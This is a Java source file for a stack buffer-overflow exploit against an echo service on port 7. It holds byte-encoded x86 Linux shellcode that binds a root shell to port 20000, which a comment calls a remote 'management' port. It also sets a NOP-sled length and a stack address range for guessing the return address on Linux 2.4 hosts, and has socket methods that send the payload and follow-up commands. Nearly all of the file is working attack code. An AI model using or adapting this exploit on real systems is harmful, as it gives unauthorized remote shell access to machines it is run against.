

import java.io.*;
import java.net.*;

public class BufferOverflow {

	// Shell code to open a remote "management" port on the target.
	public byte[] shellCode = {  
		(byte)0x31, (byte)0xdb, // xor    ebx, ebx
		(byte)0xf7, (byte)0xe3, // mul    ebx
		(byte)0xb0, (byte)0x66, // mov     al, 102
		(byte)0x53, // push    ebx
		(byte)0x43, // inc     ebx
		(byte)0x53, // push    ebx
		(byte)0x43, // inc     ebx
		(byte)0x53, // push    ebx
		(byte)0x89, (byte)0xe1, // mov     ecx, esp
		(byte)0x4b, // dec     ebx
		(byte)0xcd, (byte)0x80, // int     80h
		(byte)0x89, (byte)0xc7, // mov     edi, eax
		(byte)0x52, // push    edx
		(byte)0x66, (byte)0x68, (byte)0x4e, (byte)0x20, // push    word 8270
		(byte)0x43, // inc     ebx
		(byte)0x66, (byte)0x53, // push    bx
		(byte)0x89, (byte)0xe1, // mov     ecx, esp
		(byte)0xb0, (byte)0xef, // mov    al, 239
		(byte)0xf6, (byte)0xd0, // not    al
		(byte)0x50, // push    eax
		(byte)0x51, // push    ecx
		(byte)0x57, // push    edi
		(byte)0x89, (byte)0xe1, // mov     ecx, esp
		(byte)0xb0, (byte)0x66, // mov     al, 102
		(byte)0xcd, (byte)0x80, // int     80h
		(byte)0xb0, (byte)0x66, // mov     al, 102
		(byte)0x43, // inc    ebx
		(byte)0x43, // inc    ebx
		(byte)0xcd, (byte)0x80, // int     80h
		(byte)0x50, // push    eax
		(byte)0x50, // push    eax
		(byte)0x57, // push    edi
		(byte)0x89, (byte)0xe1, // mov    ecx, esp
		(byte)0x43, // inc    ebx
		(byte)0xb0, (byte)0x66, // mov    al, 102
		(byte)0xcd, (byte)0x80, // int    80h
		(byte)0x89, (byte)0xd9, // mov    ecx, ebx
		(byte)0x89, (byte)0xc3, // mov     ebx, eax
		(byte)0xb0, (byte)0x3f, // mov     al, 63
		(byte)0x49, // dec     ecx
		(byte)0xcd, (byte)0x80, // int     80h
		(byte)0x41, // inc     ecx
		(byte)0xe2, (byte)0xf8, // loop    lp
		(byte)0x51, // push    ecx
		(byte)0x68, (byte)0x6e, (byte)0x2f, (byte)0x73, (byte)0x68, // push    dword 68732f6eh
		(byte)0x68, (byte)0x2f, (byte)0x2f, (byte)0x62, (byte)0x69, // push    dword 69622f2fh
		(byte)0x89, (byte)0xe3, // mov     ebx, esp
		(byte)0x51, // push    ecx
		(byte)0x53, // push    ebx
		(byte)0x89, (byte)0xe1, // mov    ecx, esp
		(byte)0xb0, (byte)0xf4, // mov    al, 244
		(byte)0xf6, (byte)0xd0, // not    al
		(byte)0xcd, (byte)0x80, // int     80h 
		(byte)0
  };
	
	/* Beginning and end addresses for trying on the stack. For a reason I
	 * can't explain, if echoserv is launched from a shell, the stack starts
	 * at a different location than if launched by rc.d. Note that this will
	 * only work on target machines running Linux 2.4, since 2.6 implements
	 * address space randomization. */
	public static final int START_ADDRESS = 0xbffff000;
	public static final int END_ADDRESS = START_ADDRESS + 0xf00;
	
	// Reperesents the NOP instruction.
	public static final byte NOP = (byte)0x90;
	
	public static final int PACKET_LENGTH = 1040;
	public static final int NOP_BUFFER_LENGTH = 512;
	public static final int ECHO_PORT = 7;
	public static final int SHELL_PORT = 20000;

	private OutputStream writer = null;

	public boolean connect(String IpAddress, int port) {
		Socket s;
		try {
			s = new Socket(IpAddress, port);
		} catch (UnknownHostException e) {
			//e.printStackTrace();
			return false;
		} catch (IOException e) {
			//e.printStackTrace();
			return false;
		}

		try {
		    writer = s.getOutputStream();
		} catch (IOException e) {
		    //e.printStackTrace();
			return false;
		}

		return true;
	}

	public boolean sendCommands(String[] commands) {
		try {
			for (int i = 0; i < commands.length; i++) {
				writer.write(commands[i].getBytes());
				Thread.sleep(2000);
			}
		} catch (IOException e) {
			e.printStackTrace();
			return false;
		} catch (InterruptedException e) {
			e.printStackTrace();
			return false;
		}
		return true;
	}
	
	public boolean sendCommands(byte[] commands){
		try {
			writer.write(commands);
			Thread.sleep(2000);
		} catch (IOException e) {
			e.printStackTrace();
			return false;
		} catch (InterruptedException e) {
			e.printStackTrace();
			return false;
		}
		return true;
	}
}
